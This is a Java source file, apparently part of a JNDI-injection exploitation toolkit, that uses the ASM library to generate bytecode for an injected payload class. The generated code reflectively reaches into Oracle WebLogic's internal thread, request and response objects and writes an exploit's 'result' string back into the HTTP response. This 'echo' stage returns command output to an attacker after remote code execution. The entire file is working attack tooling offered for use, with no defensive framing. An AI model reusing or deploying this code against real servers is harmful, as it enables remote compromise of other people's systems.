165
https://raw.githubusercontent.com/JosephTribbianni/JNDI/master/src/main/java/org/su18/asm/echo/WebLogicEcho.java
package org.su18.asm.echo;

import org.objectweb.asm.Label;
import org.objectweb.asm.MethodVisitor;
import org.objectweb.asm.Opcodes;
import org.objectweb.asm.Type;

public class WebLogicEcho implements Opcodes {

	public static void insert(String className, MethodVisitor mv) {
		Label label0 = new Label();
		mv.visitLabel(label0);
		mv.visitLdcInsn("weblogic.work.ExecuteThread");
		mv.visitMethodInsn(INVOKESTATIC, "java/lang/Class", "forName", "(Ljava/lang/String;)Ljava/lang/Class;", false);
		mv.visitVarInsn(ASTORE, 1);
		Label label1 = new Label();
		mv.visitLabel(label1);
		mv.visitVarInsn(ALOAD, 1);
		mv.visitLdcInsn("getCurrentWork");
		mv.visitInsn(ICONST_0);
		mv.visitTypeInsn(ANEWARRAY, "java/lang/Class");
		mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Class", "getDeclaredMethod", "(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;", false);
		mv.visitVarInsn(ASTORE, 2);
		Label label2 = new Label();
		mv.visitLabel(label2);
		mv.visitVarInsn(ALOAD, 2);
		mv.visitMethodInsn(INVOKESTATIC, "java/lang/Thread", "currentThread", "()Ljava/lang/Thread;", false);
		mv.visitInsn(ICONST_0);
		mv.visitTypeInsn(ANEWARRAY, "java/lang/Object");
		mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/reflect/Method", "invoke", "(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;", false);
		mv.visitVarInsn(ASTORE, 3);
		Label label3 = new Label();
		mv.visitLabel(label3);
		mv.visitLdcInsn("weblogic.servlet.internal.ServletRequestImpl");
		mv.visitMethodInsn(INVOKESTATIC, "java/lang/Class", "forName", "(Ljava/lang/String;)Ljava/lang/Class;", false);
		mv.visitVarInsn(ASTORE, 4);
		Label label4 = new Label();
		mv.visitLabel(label4);
		mv.visitVarInsn(ALOAD, 4);
		mv.visitLdcInsn("getResponse");
		mv.visitInsn(ICONST_0);
		mv.visitTypeInsn(ANEWARRAY, "java/lang/Class");
		mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Class", "getDeclaredMethod", "(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;", false);
		mv.visitVarInsn(ASTORE, 5);
		Label label5 = new Label();
		mv.visitLabel(label5);
		mv.visitVarInsn(ALOAD, 5);
		mv.visitVarInsn(ALOAD, 3);
		mv.visitInsn(ICONST_0);
		mv.visitTypeInsn(ANEWARRAY, "java/lang/Object");
		mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/reflect/Method", "invoke", "(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;", false);
		mv.visitVarInsn(ASTORE, 6);
		Label label6 = new Label();
		mv.visitLabel(label6);
		mv.visitLdcInsn("weblogic.servlet.internal.ServletResponseImpl");
		mv.visitMethodInsn(INVOKESTATIC, "java/lang/Class", "forName", "(Ljava/lang/String;)Ljava/lang/Class;", false);
		mv.visitVarInsn(ASTORE, 7);
		Label label7 = new Label();
		mv.visitLabel(label7);
		mv.visitVarInsn(ALOAD, 7);
		mv.visitLdcInsn("getServletOutputStream");
		mv.visitInsn(ICONST_0);
		mv.visitTypeInsn(ANEWARRAY, "java/lang/Class");
		mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Class", "getDeclaredMethod", "(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;", false);
		mv.visitVarInsn(ASTORE, 8);
		Label label8 = new Label();
		mv.visitLabel(label8);
		mv.visitVarInsn(ALOAD, 8);
		mv.visitVarInsn(ALOAD, 6);
		mv.visitInsn(ICONST_0);
		mv.visitTypeInsn(ANEWARRAY, "java/lang/Object");
		mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/reflect/Method", "invoke", "(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;", false);
		mv.visitVarInsn(ASTORE, 9);
		Label label9 = new Label();
		mv.visitLabel(label9);
		mv.visitLdcInsn("weblogic.xml.util.StringInputStream");
		mv.visitMethodInsn(INVOKESTATIC, "java/lang/Class", "forName", "(Ljava/lang/String;)Ljava/lang/Class;", false);
		mv.visitVarInsn(ASTORE, 10);
		Label label10 = new Label();
		mv.visitLabel(label10);
		mv.visitVarInsn(ALOAD, 10);
		mv.visitInsn(ICONST_1);
		mv.visitTypeInsn(ANEWARRAY, "java/lang/Class");
		mv.visitInsn(DUP);
		mv.visitInsn(ICONST_0);
		mv.visitLdcInsn(Type.getType("Ljava/lang/String;"));
		mv.visitInsn(AASTORE);
		mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Class", "getConstructor", "([Ljava/lang/Class;)Ljava/lang/reflect/Constructor;", false);
		mv.visitVarInsn(ASTORE, 11);
		Label label11 = new Label();
		mv.visitLabel(label11);
		mv.visitVarInsn(ALOAD, 11);
		mv.visitInsn(ICONST_1);
		mv.visitTypeInsn(ANEWARRAY, "java/lang/Object");
		mv.visitInsn(DUP);
		mv.visitInsn(ICONST_0);
		mv.visitVarInsn(ALOAD, 0);
		mv.visitFieldInsn(GETFIELD, className, "result", "Ljava/lang/String;");
		mv.visitInsn(AASTORE);
		mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/reflect/Constructor", "newInstance", "([Ljava/lang/Object;)Ljava/lang/Object;", false);
		mv.visitVarInsn(ASTORE, 12);
		Label label12 = new Label();
		mv.visitLabel(label12);
		mv.visitLdcInsn("weblogic.servlet.internal.ServletOutputStreamImpl");
		mv.visitMethodInsn(INVOKESTATIC, "java/lang/Class", "forName", "(Ljava/lang/String;)Ljava/lang/Class;", false);
		mv.visitVarInsn(ASTORE, 13);
		Label label13 = new Label();
		mv.visitLabel(label13);
		mv.visitVarInsn(ALOAD, 13);
		mv.visitLdcInsn("writeStream");
		mv.visitInsn(ICONST_1);
		mv.visitTypeInsn(ANEWARRAY, "java/lang/Class");
		mv.visitInsn(DUP);
		mv.visitInsn(ICONST_0);
		mv.visitVarInsn(ALOAD, 10);
		mv.visitInsn(AASTORE);
		mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Class", "getDeclaredMethod", "(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;", false);
		mv.visitVarInsn(ASTORE, 14);
		Label label14 = new Label();
		mv.visitLabel(label14);
		mv.visitVarInsn(ALOAD, 14);
		mv.visitVarInsn(ALOAD, 9);
		mv.visitInsn(ICONST_1);
		mv.visitTypeInsn(ANEWARRAY, "java/lang/Object");
		mv.visitInsn(DUP);
		mv.visitInsn(ICONST_0);
		mv.visitVarInsn(ALOAD, 12);
		mv.visitInsn(AASTORE);
		mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/reflect/Method", "invoke", "(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;", false);
		mv.visitInsn(POP);
		Label label15 = new Label();
		mv.visitLabel(label15);
		mv.visitVarInsn(ALOAD, 13);
		mv.visitLdcInsn("flush");
		mv.visitInsn(ICONST_0);
		mv.visitTypeInsn(ANEWARRAY, "java/lang/Class");
		mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Class", "getDeclaredMethod", "(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;", false);
		mv.visitVarInsn(ASTORE, 15);
		Label label16 = new Label();
		mv.visitLabel(label16);
		mv.visitVarInsn(ALOAD, 15);
		mv.visitVarInsn(ALOAD, 9);
		mv.visitInsn(ICONST_0);
		mv.visitTypeInsn(ANEWARRAY, "java/lang/Object");
		mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/reflect/Method", "invoke", "(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;", false);
		mv.visitInsn(POP);
		Label label17 = new Label();
		mv.visitLabel(label17);
		mv.visitVarInsn(ALOAD, 7);
		mv.visitLdcInsn("getWriter");
		mv.visitInsn(ICONST_0);
		mv.visitTypeInsn(ANEWARRAY, "java/lang/Class");
		mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Class", "getDeclaredMethod", "(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;", false);
		mv.visitVarInsn(ASTORE, 16);
		Label label18 = new Label();
		mv.visitLabel(label18);
		mv.visitVarInsn(ALOAD, 16);
		mv.visitVarInsn(ALOAD, 6);
		mv.visitInsn(ICONST_0);
		mv.visitTypeInsn(ANEWARRAY, "java/lang/Object");
		mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/reflect/Method", "invoke", "(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;", false);
		mv.visitVarInsn(ASTORE, 17);
		Label label19 = new Label();
		mv.visitLabel(label19);
		mv.visitLdcInsn("java.io.PrintWriter");
		mv.visitMethodInsn(INVOKESTATIC, "java/lang/Class", "forName", "(Ljava/lang/String;)Ljava/lang/Class;", false);
		mv.visitVarInsn(ASTORE, 18);
		Label label20 = new Label();
		mv.visitLabel(label20);
		mv.visitVarInsn(ALOAD, 18);
		mv.visitLdcInsn("write");
		mv.visitInsn(ICONST_1);
		mv.visitTypeInsn(ANEWARRAY, "java/lang/Class");
		mv.visitInsn(DUP);
		mv.visitInsn(ICONST_0);
		mv.visitLdcInsn(Type.getType("Ljava/lang/String;"));
		mv.visitInsn(AASTORE);
		mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Class", "getDeclaredMethod", "(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;", false);
		mv.visitVarInsn(ASTORE, 19);
		Label label21 = new Label();
		mv.visitLabel(label21);
		mv.visitVarInsn(ALOAD, 19);
		mv.visitVarInsn(ALOAD, 17);
		mv.visitInsn(ICONST_1);
		mv.visitTypeInsn(ANEWARRAY, "java/lang/Object");
		mv.visitInsn(DUP);
		mv.visitInsn(ICONST_0);
		mv.visitLdcInsn("");
		mv.visitInsn(AASTORE);
		mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/reflect/Method", "invoke", "(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;", false);
		mv.visitInsn(POP);
		Label label22 = new Label();
		mv.visitLabel(label22);
		mv.visitInsn(RETURN);
		Label label23 = new Label();
		mv.visitLabel(label23);
		mv.visitLocalVariable("this", "L"+className+";", null, label0, label23, 0);
		mv.visitLocalVariable("executeThread", "Ljava/lang/Class;", "Ljava/lang/Class<*>;", label1, label23, 1);
		mv.visitLocalVariable("m", "Ljava/lang/reflect/Method;", null, label2, label23, 2);
		mv.visitLocalVariable("currentWork", "Ljava/lang/Object;", null, label3, label23, 3);
		mv.visitLocalVariable("servletRequestImpl", "Ljava/lang/Class;", "Ljava/lang/Class<*>;", label4, label23, 4);
		mv.visitLocalVariable("m2", "Ljava/lang/reflect/Method;", null, label5, label23, 5);
		mv.visitLocalVariable("response", "Ljava/lang/Object;", null, label6, label23, 6);
		mv.visitLocalVariable("servletResponseImpl", "Ljava/lang/Class;", "Ljava/lang/Class<*>;", label7, label23, 7);
		mv.visitLocalVariable("m3", "Ljava/lang/reflect/Method;", null, label8, label23, 8);
		mv.visitLocalVariable("outputStream", "Ljava/lang/Object;", null, label9, label23, 9);
		mv.visitLocalVariable("stringInputStream", "Ljava/lang/Class;", "Ljava/lang/Class<*>;", label10, label23, 10);
		mv.visitLocalVariable("m5", "Ljava/lang/reflect/Constructor;", "Ljava/lang/reflect/Constructor<*>;", label11, label23, 11);
		mv.visitLocalVariable("resultStream", "Ljava/lang/Object;", null, label12, label23, 12);
		mv.visitLocalVariable("servletOutputStreamImpl", "Ljava/lang/Class;", "Ljava/lang/Class<*>;", label13, label23, 13);
		mv.visitLocalVariable("m4", "Ljava/lang/reflect/Method;", null, label14, label23, 14);
		mv.visitLocalVariable("m6", "Ljava/lang/reflect/Method;", null, label16, label23, 15);
		mv.visitLocalVariable("m7", "Ljava/lang/reflect/Method;", null, label18, label23, 16);
		mv.visitLocalVariable("writer", "Ljava/lang/Object;", null, label19, label23, 17);
		mv.visitLocalVariable("printWriter", "Ljava/lang/Class;", "Ljava/lang/Class<*>;", label20, label23, 18);
		mv.visitLocalVariable("m8", "Ljava/lang/reflect/Method;", null, label21, label23, 19);

	}

}
